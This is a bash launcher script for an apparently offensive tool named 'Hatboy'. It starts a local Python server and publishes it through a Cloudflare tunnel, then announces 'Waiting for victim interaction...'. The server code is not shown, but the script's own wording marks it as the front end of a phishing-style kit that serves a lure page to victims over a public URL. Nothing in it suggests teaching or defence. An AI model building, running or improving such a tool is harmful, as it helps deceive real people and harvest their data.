#!/bin/bash

# Display Hatboy ASCII Art
printf "\e[1;92m        _____  \e[0m\n"
printf "\e[1;92m       /     \ \e[0m\n"
printf "\e[1;92m      | () () |\e[0m\n"
printf "\e[1;92m       \  ^  / \e[0m\n"
printf "\e[1;92m        |||||  \e[0m\n"
printf "\e[1;92m        |||||  \e[0m\n"
printf "\e[1;77m     __/_____\__ \e[0m\n"
printf "\e[1;77m    |___________| \e[0m\n"
printf "\e[1;77m     MISTER  X \e[0m\n"

# Menu for starting the tool
echo "Welcome to Hatboy!"
echo "Please select an option to start:"
echo "1. Start Local Server"
echo "2. Use Cloudflare Tunnel"
read -p "Select an option (1 or 2): " option

if [[ $option -eq 1 ]]; then
    echo "Starting local server..."
    python3 hatboy_server.py || { echo "Local server failed to start. Ensure Flask is installed."; exit 1; }
elif [[ $option -eq 2 ]]; then
    echo "Starting Cloudflare Tunnel..."

    # Submenu for template selection
    echo "Select a template:"
    echo "1. Default Template"
    read -p "Select a template (1): " template_option

    if [[ $template_option -eq 1 ]]; then
        echo "Using Default Template..."
        python3 hatboy_server.py &  # Start local server on port 8080
        SERVER_PID=$!

        sleep 3  # Allow server to initialize

        if ps -p $SERVER_PID > /dev/null; then
            echo "Local server is running."
        else
            echo "Failed to start local server. Exiting..."
            exit 1
        fi

        # Start Cloudflare Tunnel and fetch the public URL
        echo "Starting Cloudflare Tunnel on port 8080..."
        TUNNEL_OUTPUT=$(cloudflared tunnel --url http://localhost:8080 2>&1)
        TUNNEL_URL=$(echo "$TUNNEL_OUTPUT" | grep -oE "https://[a-z0-9.-]+")

        if [[ -n "$TUNNEL_URL" ]]; then
            echo -e "\nYour site is live at: \e[1;92m$TUNNEL_URL\e[0m"
            echo "Waiting for victim interaction..."
        else
            echo -e "\n\e[1;91mERROR:\e[0m Could not retrieve the live URL. Cloudflare output:"
            echo "$TUNNEL_OUTPUT"
        fi
    else
        echo "Invalid template selection!"
    fi
else
    echo "Invalid option! Exiting..."
fi
